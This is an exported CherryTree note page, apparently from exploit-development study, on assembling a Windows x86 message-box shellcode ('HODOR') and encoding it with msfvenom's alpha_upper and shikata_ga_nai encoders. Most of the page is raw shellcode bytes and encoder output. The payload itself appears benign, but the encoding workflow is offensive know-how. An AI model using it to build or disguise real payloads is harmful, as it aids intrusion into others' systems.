<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Compile ASM and convert to HEX</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Compile ASM and convert to HEX</h1><br/><strong>Compile</strong><br />nasm -f elf msgbox_hodor.asm; ld -m i386pe -o msgbox_hodor msgbox_hodor.o<br /><br /><strong>To hex</strong><br />bash convert_bin_sc.sh msgbox_hodor.o<br />"\x31\xd2\xeb\x33\x59\x88\x51\x0a"<br />"\xbb\x5c\x39\xe3\x77\x51\xff\xd3"<br />"\xeb\x35\x59\x31\xd2\x88\x51\x0b"<br />"\x51\x50\xbb\xd3\x33\xe3\x77\xff"<br />"\xd3\xeb\x35\x59\x31\xd2\x88\x51"<br />"\x0f\x52\x52\x51\x51\x52\xff\xd0"<br />"\xb8\x4f\x21\xe3\x77\xff\xd0\xe8"<br />"\xc8\xff\xff\xff\x75\x73\x65\x72"<br />"\x33\x32\x2e\x64\x6c\x6c\x4e\xe8"<br />"\xc6\xff\xff\xff\x4d\x65\x73\x73"<br />"\x61\x67\x65\x42\x6f\x78\x41\x4e"<br />"\xe8\xc6\xff\xff\xff\x48\x4f\x44"<br />"\x4f\x52\x48\x4f\x44\x4f\x52\x48"<br />"\x4f\x44\x4f\x52\x4e"<br /><br /><br /><strong>In python script, output to bin</strong><br />python test_payload.py &gt; msgbox_hodor.bin<br /><br /><strong>Convert payload encoded via MSF</strong><br />cat msgbox_hodor.bin | msfvenom -a x86 --platform windows -e x86/alpha_upper -f python -v shellcode -b "\x0a\x0d\x00" -<br />Attempting to read payload from STDIN...<br />Found 1 compatible encoders<br />Attempting to encode payload with 1 iterations of x86/alpha_upper<br />x86/alpha_upper succeeded with size 287 (iteration=0)<br />x86/alpha_upper chosen with final size 287<br />Payload size: 287 bytes<br />Final size of python file: 1548 bytes<br />shellcode =  ""<br />shellcode += "\x89\xe3\xda\xd6\xd9\x73\xf4\x5d\x55\x59\x49\x49"<br />shellcode += "\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"<br />shellcode += "\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"<br />shellcode += "\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"<br />shellcode += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"<br />shellcode += "\x50\x38\x41\x43\x4a\x4a\x49\x56\x51\x38\x52\x4a"<br />shellcode += "\x4b\x47\x43\x46\x39\x4d\x58\x36\x31\x45\x5a\x4f"<br />shellcode += "\x4b\x51\x4c\x50\x39\x5a\x43\x43\x47\x36\x31\x4b"<br />shellcode += "\x4f\x4e\x33\x5a\x4b\x37\x45\x56\x39\x30\x31\x48"<br />shellcode += "\x52\x4b\x38\x56\x31\x34\x4b\x36\x31\x56\x30\x4f"<br />shellcode += "\x4b\x39\x43\x36\x53\x4d\x33\x52\x57\x4b\x4f\x4e"<br />shellcode += "\x33\x4a\x4b\x56\x55\x50\x59\x50\x31\x39\x42\x4b"<br />shellcode += "\x38\x46\x31\x34\x4f\x31\x42\x31\x42\x36\x31\x36"<br />shellcode += "\x31\x30\x52\x4b\x4f\x38\x50\x4e\x58\x30\x4f\x47"<br />shellcode += "\x51\x5a\x43\x42\x57\x4b\x4f\x58\x50\x4a\x48\x48"<br />shellcode += "\x48\x4b\x4f\x4b\x4f\x4b\x4f\x42\x55\x42\x53\x45"<br />shellcode += "\x35\x42\x52\x56\x53\x46\x52\x36\x4e\x32\x44\x42"<br />shellcode += "\x4c\x32\x4c\x50\x4e\x4d\x38\x59\x56\x4b\x4f\x4b"<br />shellcode += "\x4f\x4b\x4f\x30\x4d\x45\x35\x53\x43\x34\x33\x35"<br />shellcode += "\x31\x55\x37\x32\x45\x30\x42\x52\x4f\x32\x58\x51"<br />shellcode += "\x51\x30\x4e\x4b\x58\x49\x56\x4b\x4f\x4b\x4f\x4b"<br />shellcode += "\x4f\x31\x58\x30\x4f\x37\x34\x50\x4f\x36\x32\x47"<br />shellcode += "\x38\x50\x4f\x30\x44\x30\x4f\x30\x52\x47\x38\x50"<br />shellcode += "\x4f\x47\x34\x50\x4f\x46\x32\x30\x4e\x41\x41"<br /><br /><strong>Convert payload regular via MSF</strong><br />$ cat msgbox_hodor.bin | msfvenom -a x86 --platform windows -f python -v shellcode -b "\x0a\x0d\x00" -<br />Attempting to read payload from STDIN...<br />Found 11 compatible encoders<br />Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br />x86/shikata_ga_nai succeeded with size 136 (iteration=0)<br />x86/shikata_ga_nai chosen with final size 136<br />Payload size: 136 bytes<br />Final size of python file: 752 bytes<br />shellcode =  ""<br />shellcode += "\xdb\xc9\xb8\x4b\xb6\xf1\x20\xd9\x74\x24\xf4\x5d"<br />shellcode += "\x2b\xc9\xb1\x1c\x31\x45\x18\x83\xed\xfc\x03\x45"<br />shellcode += "\x5f\x54\x04\x11\x8d\x73\xd4\x0b\xb9\xd5\x11\x17"<br />shellcode += "\xe5\xec\xc6\x10\x44\xf0\xda\x34\x53\x57\xec\x18"<br />shellcode += "\x13\x36\x05\xcc\x73\x02\xca\xdd\x90\x03\x12\xf2"<br />shellcode += "\xbd\xd9\xb5\xc4\x93\xaa\x17\x28\x41\xf9\xc6\x67"<br />shellcode += "\x37\x02\x38\x3f\xf8\xdd\x5a\x37\xf9\xce\x75\x70"<br />shellcode += "\xfa\x10\x7a\xf4\x77\x8a\xf7\xc4\x45\x7a\x9c\x46"<br />shellcode += "\xc5\xcc\xb4\x51\xea\x2e\xbb\x13\x71\xa2\x37\xcd"<br />shellcode += "\x1e\x21\xfa\x62\x98\xe8\xb4\x94\x9e\x14\xb7\x9a"<br />shellcode += "\x56\xa4\x0c\x2a\x34\x72\xc2\xf0\xf7\xd0\x94\xb7"<br />shellcode += "\x43\x9a\x76\x06"<br /></div></body></html>